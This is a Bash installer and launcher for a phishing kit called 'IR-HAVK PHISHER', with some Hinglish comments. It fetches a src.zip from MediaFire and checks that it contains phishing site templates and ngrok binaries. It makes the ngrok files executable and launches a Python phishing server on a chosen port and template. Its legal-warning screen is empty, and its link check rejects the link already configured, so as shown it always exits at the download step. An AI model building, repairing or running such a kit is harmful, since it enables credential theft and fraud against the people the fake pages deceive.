#!/bin/bash


# ⚙️ CONFIGURATION - SIRF YEH LINK CHANGE KARO ⚙️
# MediaFire pe src.zip upload karo, uska link yahan dalo
MEDIAFIRE_SRC_ZIP="https://www.mediafire.com/file/u38hbc3mku2i6o8/src.zip/file"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
BLINK='\033[5m'
NC='\033[0m'

# Directories
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC_DIR="$SCRIPT_DIR/src"
FILES_DIR="$SCRIPT_DIR/files"
TEMP_DIR="$SCRIPT_DIR/.temp"

clear

# ==================== ANIMATIONS ====================

spinner() {
    local pid=$1
    local message=$2
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) %10 ))
        printf "\r${CYAN}[${spin:$i:1}]${NC} ${message}"
        sleep 0.1
    done
    printf "\r${GREEN}[✓]${NC} ${message} - Done!                    \n"
}

progress_bar() {
    local current=$1
    local total=$2
    local message=$3
    local width=50
    local percent=$((current * 100 / total))
    local filled=$((width * current / total))
    
    printf "\r${CYAN}[${GREEN}"
    for ((i=0; i<filled; i++)); do printf "█"; done
    for ((i=filled; i<width; i++)); do printf "░"; done
    printf "${CYAN}] ${percent}%%${NC} - ${message}"
    
    if [ $current -eq $total ]; then
        echo ""
    fi
}

typewriter() {
    local text="$1"
    local delay=${2:-0.02}
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

show_loading_screen() {
    clear
    echo -e "${GREEN}"
    echo ""
    echo "    ██╗██████╗   ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗"
    echo "    ██║██╔══██╗  ██║  ██║██╔══██╗██║   ██║██║ ██╔╝"
    echo "    ██║██████╔╝  ███████║███████║██║   ██║█████╔╝ "
    echo "    ██║██╔══██╗  ██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗ "
    echo "    ██║██║  ██║  ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗"
    echo "    ╚═╝╚═╝  ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝"
    echo ""
    echo "    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ "
    echo "    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗"
    echo "    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝"
    echo "    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
    echo "    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║"
    echo "    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${RED}"
    echo -e "${NC}"
}

# ==================== DOWNLOAD FUNCTION ====================

download_and_extract_src() {
    echo -e "${CYAN}   DOWNLOADING src.zip  ${NC}"
    
    # Check if link is configured
    if [ -z "$MEDIAFIRE_SRC_ZIP" ] || [ "$MEDIAFIRE_SRC_ZIP" = "https://www.mediafire.com/file/u38hbc3mku2i6o8/src.zip/file" ]; then
        echo -e "${RED}  ❌ ERROR: MediaFire link not configured! ${NC}"
        echo -e "\n${YELLOW}Please edit setup.sh and set MEDIAFIRE_SRC_ZIP${NC}"
        echo -e "${YELLOW}1. Upload src folder as src.zip to MediaFire${NC}"
        echo -e "${YELLOW}2. Get the download link${NC}"
        echo -e "${YELLOW}3. Paste it in MEDIAFIRE_SRC_ZIP variable${NC}"
        echo -e "\n${CYAN}Example:${NC}"
        echo -e 'MEDIAFIRE_SRC_ZIP="https://www.mediafire.com/file/u38hbc3mku2i6o8/src.zip/file"'
        exit 1
    fi
    
    # Create temp directory
    mkdir -p "$TEMP_DIR"
    echo -e "${PURPLE}${NC}  📦 Downloading src.zip...              ${PURPLE}${NC}"
    
    local download_success=false
    
    # Download with progress
    if command -v wget &> /dev/null; then
        wget -O "$TEMP_DIR/src.zip" "$MEDIAFIRE_SRC_ZIP" 2>&1 | \
        stdbuf -oL tr '\r' '\n' | while read -r line; do
            if [[ $line =~ ([0-9]+)% ]]; then
                progress_bar "${BASH_REMATCH[1]}" 100 "Downloading src.zip"
            fi
        done
        if [ -f "$TEMP_DIR/src.zip" ] && [ "$(stat -c%s "$TEMP_DIR/src.zip" 2>/dev/null || echo 0)" -gt 1000 ]; then
            download_success=true
        fi
    elif command -v curl &> /dev/null; then
        curl -# -L -o "$TEMP_DIR/src.zip" "$MEDIAFIRE_SRC_ZIP" 2>&1 | \
        while read -r line; do
            if [[ $line =~ ([0-9]+)% ]]; then
                progress_bar "${BASH_REMATCH[1]}" 100 "Downloading src.zip"
            fi
        done
        if [ -f "$TEMP_DIR/src.zip" ] && [ "$(stat -c%s "$TEMP_DIR/src.zip" 2>/dev/null || echo 0)" -gt 1000 ]; then
            download_success=true
        fi
    fi
    
    if [ "$download_success" = true ]; then
        local file_size=$(du -h "$TEMP_DIR/src.zip" | cut -f1)
        echo -e "\n${GREEN}[✓] Downloaded src.zip ($file_size)${NC}"
    else
        echo -e "\n${RED}[✗] Download failed! Check your internet and MediaFire link${NC}"
        rm -rf "$TEMP_DIR"
        return 1
    fi
    
    # Extract src.zip
    echo -e "${PURPLE}${NC}  📦 Extracting src.zip...   ${PURPLE}${NC}"

    
    # Backup existing src if exists
    if [ -d "$SRC_DIR" ]; then
        echo -e "${YELLOW}[!] Existing src/ found, backing up...${NC}"
        mv "$SRC_DIR" "${SRC_DIR}_backup_$(date +%s)" 2>/dev/null
    fi
    
    mkdir -p "$SRC_DIR"
    
    if unzip -o "$TEMP_DIR/src.zip" -d "$SRC_DIR" > /dev/null 2>&1; then
        echo -e "${GREEN}[✓] src.zip extracted successfully!${NC}"
    else
        echo -e "${RED}[✗] Extraction failed! File may be corrupt${NC}"
        rm -rf "$TEMP_DIR"
        return 1
    fi
    
    # Cleanup
    rm -rf "$TEMP_DIR"
    echo -e "${GREEN}[✓] Cleanup complete${NC}"
    
    return 0
}

# ==================== VERIFICATION ====================

verify_src_structure() {
    echo -e "${CYAN}  🔍 VERIFYING src/ STRUCTURE  ${NC}"
    
    local errors=0
    local warnings=0
    local success=0
    
    echo -e "${PURPLE} Checking src/ contents ${NC}"
    
    # Check required items
    declare -A checks=(
        ["$SRC_DIR"]="src/ directory"
        ["$SRC_DIR/websites.zip"]="src/websites.zip"
        ["$SRC_DIR/ngrok"]="src/ngrok/ directory"
        ["$SRC_DIR/phishingsites"]="src/phishingsites/ directory"
    )
    
    for path in "${!checks[@]}"; do
        local name="${checks[$path]}"
        if [ -e "$path" ]; then
            echo -e "${PURPLE}│${NC} ${GREEN}✓${NC} $name"
            success=$((success + 1))
        else
            echo -e "${PURPLE}│${NC} ${RED}✗${NC} $name ${RED}(MISSING)${NC}"
            errors=$((errors + 1))
        fi
    done
    
    # Check ngrok binaries
    echo -e "${PURPLE} Checking ngrok binaries ${NC}"
    local ngrok_count=$(ls "$SRC_DIR/ngrok/" 2>/dev/null | wc -l)
    if [ "$ngrok_count" -gt 0 ]; then
        echo -e "${PURPLE}│${NC} ${GREEN}✓${NC} Ngrok files found: $ngrok_count"
        success=$((success + 1))
    else
        echo -e "${PURPLE}│${NC} ${YELLOW}⚠${NC} No ngrok binaries (optional)"
        warnings=$((warnings + 1))
    fi
    
    # Check phishingsites
    echo -e "${PURPLE} Checking phishing sites ${NC}"
    local sites_count=$(ls "$SRC_DIR/phishingsites/" 2>/dev/null | grep ".zip" | wc -l)
    if [ "$sites_count" -gt 0 ]; then
        echo -e "${PURPLE}│${NC} ${GREEN}✓${NC} Phishing sites: $sites_count templates"
        success=$((success + 1))
    else
        echo -e "${PURPLE}│${NC} ${YELLOW}⚠${NC} No phishing site zips (optional)"
        warnings=$((warnings + 1))
    fi
    
    echo -e "${PURPLE}${NC}"
    
    # Summary
    echo -e "\n${CYAN}Summary:${NC}"
    echo -e "  ${GREEN}✓ Success: $success${NC}"
    [ $warnings -gt 0 ] && echo -e "  ${YELLOW}⚠ Warnings: $warnings${NC}"
    [ $errors -gt 0 ] && echo -e "  ${RED}✗ Errors: $errors${NC}"
    
    if [ $errors -gt 0 ]; then
        echo -e "${RED}  ❌ VERIFICATION FAILED!                  ${NC}"
        echo -e "${RED}  Required files missing in src/          ${NC}"
        echo -e "\n${YELLOW}Make sure your src.zip contains:${NC}"
        echo -e "${CYAN}src/"
        echo -e "├── websites.zip"
        echo -e "├── ngrok/"
        echo -e "│   └── ngrok (binary files)"
        echo -e "└── phishingsites/"
        echo -e "    └── *.zip (phishing templates)${NC}"
        return 1
    else
        echo -e "\n${GREEN}${NC}"
        echo -e "${GREEN}  ✅ VERIFICATION PASSED!                  ${NC}"
        echo -e "${GREEN}  src/ structure is correct               ${NC}"
        return 0
    fi
}

# ==================== DEPENDENCY CHECK ====================

check_dependencies() {
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  📦 CHECKING SYSTEM DEPENDENCIES  ${NC}"
    echo -e "${CYAN}${NC}\n"
    
    local packages=("php" "curl" "wget" "unzip" "python3")
    local missing=()
    
    for pkg in "${packages[@]}"; do
        echo -ne "${YELLOW}[*] $pkg...${NC}"
        if command -v $pkg &> /dev/null; then
            echo -e "\r${GREEN}[✓]${NC} $pkg found"
        else
            echo -e "\r${RED}[✗]${NC} $pkg ${RED}MISSING${NC}"
            missing+=($pkg)
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "\n${RED}[✗] Missing dependencies: ${missing[*]}${NC}"
        echo -e "\n${YELLOW}Install manually:${NC}"
        echo -e "${CYAN}sudo apt update && sudo apt install ${missing[*]} -y${NC}"
        echo -e "\n${YELLOW}Or on Termux:${NC}"
        echo -e "${CYAN}pkg update && pkg install ${missing[*]} -y${NC}"
        return 1
    else
        echo -e "\n${GREEN}[✓] All dependencies installed!${NC}"
        return 0
    fi
}

# ==================== MAIN MENU ====================

show_menu() {
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  ✅ EVERYTHING IS READY!  ${NC}"
    echo -e "${CYAN}${NC}\n"
    
    echo -e "${BOLD}${WHITE}Launch IR-HAVK PHISHER?${NC}\n"
    echo -e "${GREEN}  [1]${NC} ${WHITE}YES - Default (port 8080)${NC}"
    echo -e "${GREEN}  [2]${NC} ${WHITE}YES - Custom port${NC}"
    echo -e "${GREEN}  [3]${NC} ${WHITE}YES - With template & port${NC}"
    echo -e "${RED}  [0]${NC} ${WHITE}NO  - Exit${NC}"
    echo ""
    echo -ne "${CYAN}[?] Choice: ${NC}"
    read -r choice
    
    case $choice in
        1)
            echo -e "\n${GREEN}[*] Starting...${NC}"
            sleep 1
            clear
            python3 "$SCRIPT_DIR/ir-havk.py"
            ;;
        2)
            echo -ne "${CYAN}[?] Port: ${NC}"
            read -r port
            if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
                echo -e "\n${GREEN}[*] Starting on port $port...${NC}"
                sleep 1
                clear
                python3 "$SCRIPT_DIR/ir-havk.py" -p "$port"
            else
                echo -e "${RED}[✗] Invalid port!${NC}"
                sleep 1
                show_menu
            fi
            ;;
        3)
            echo -ne "${CYAN}[?] Port (default 8080): ${NC}"
            read -r port
            port=${port:-8080}
            echo -ne "${CYAN}[?] Template number: ${NC}"
            read -r opt
            echo -e "\n${GREEN}[*] Starting...${NC}"
            sleep 1
            clear
            python3 "$SCRIPT_DIR/ir-havk.py" -p "$port" -o "$opt"
            ;;
        0)
            echo -e "\n${GREEN}[✓] Bye! Run again: ${CYAN}./setup.sh${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[✗] Wrong choice!${NC}"
            sleep 1
            show_menu
            ;;
    esac
}

# ==================== WARNING ====================

show_warning() {
    echo -e "\n${RED}"
    cat << "EOF"

EOF
    echo -e "${NC}"
    echo -e "${YELLOW}"
    read -p "Press ENTER to continue or Ctrl+C to abort..." 
    echo -e "${NC}"
}

# ==================== MAIN ====================

main() {
    show_loading_screen
    
    echo -e "\n${CYAN}[*] Starting setup process...${NC}"
    sleep 1
    
    # Step 1: Download src.zip from MediaFire
    if ! download_and_extract_src; then
        echo -e "\n${RED}${NC}"
        echo -e "${RED}  ❌ SETUP FAILED AT DOWNLOAD STEP         ${NC}"
        echo -e "${RED}       ${NC}"
        echo -e "\n${YELLOW}Solutions:${NC}"
        echo -e "1. Check internet connection"
        echo -e "2. Verify MediaFire link is correct"
        echo -e "3. Make sure src.zip exists on MediaFire"
        exit 1
    fi
    
    # Step 2: Verify src structure
    if ! verify_src_structure; then
        echo -e "\n${RED}${NC}"
        echo -e "${RED}  ❌ SETUP FAILED AT VERIFICATION STEP     ${NC}"
        echo -e "${RED}       ${NC}"
        echo -e "\n${YELLOW}Your src.zip may be incomplete. Re-upload with proper structure.${NC}"
        exit 1
    fi
    
    # Step 3: Check system dependencies
    if ! check_dependencies; then
        echo -e "\n${RED}[!] Install missing dependencies and run again${NC}"
        exit 1
    fi
    
    # Step 4: Make files executable
    chmod +x "$SCRIPT_DIR/ir-havk.py" 2>/dev/null
    find "$SRC_DIR/ngrok/" -type f -exec chmod +x {} \; 2>/dev/null
    
    show_warning
    
    # Step 5: Show menu
    show_menu
}

# Trap Ctrl+C
trap 'echo -e "\n\n${RED}[!] Interrupted by user${NC}"; rm -rf "$TEMP_DIR"; exit 1' INT

# Run
main